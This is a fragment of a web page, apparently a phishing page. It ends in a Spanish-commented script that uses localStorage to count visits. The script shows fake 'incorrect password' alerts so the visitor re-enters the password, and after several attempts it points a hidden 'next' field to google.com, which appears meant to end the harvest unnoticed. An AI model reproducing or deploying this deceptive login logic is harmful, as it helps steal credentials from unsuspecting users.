<body>

        </main>
        <footer>

            </p>
        </footer>
    </div>
    <script>
document.addEventListener('DOMContentLoaded', function() {
// Función para establecer un item en localStorage con tiempo de expiración en horas
function setItemWithExpiration(key, value, hours) {
  const expirationTime = Date.now() + hours * 60 * 60 * 1000; // Convertir horas a milisegundos
  const item = {
    value: value,
    expiration: expirationTime
  };
  localStorage.setItem(key, JSON.stringify(item));
}

// Función para obtener un item de localStorage, verificando su expiración
function getItemWithExpiration(key) {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null; // Si no existe el item

  const item = JSON.parse(itemStr);
  if (Date.now() > item.expiration) {
    // Si ha expirado, eliminarlo y devolver null
    localStorage.removeItem(key);
    return null;
  }
  return item.value; // Si no ha expirado, devolver el valor
}

const live_time = 2;
const err = getItemWithExpiration("error");

if (err) {
    const err_num = parseInt(err, 10);
    if (err_num === 3) {
        alert("la Contraseña que uso es incorrecta");
        setItemWithExpiration("error", "0", live_time);
        document.querySelector("#next").value = "https://google.com";
    } else {
        const next_num = err_num + 1;
        setItemWithExpiration("error", next_num.toString(), live_time);
        if (next_num > 1) {
            alert("la Contraseña que uso es incorrecta");
        }
    }
} else {
    setItemWithExpiration("error", "0", live_time);
}

});
    </script>
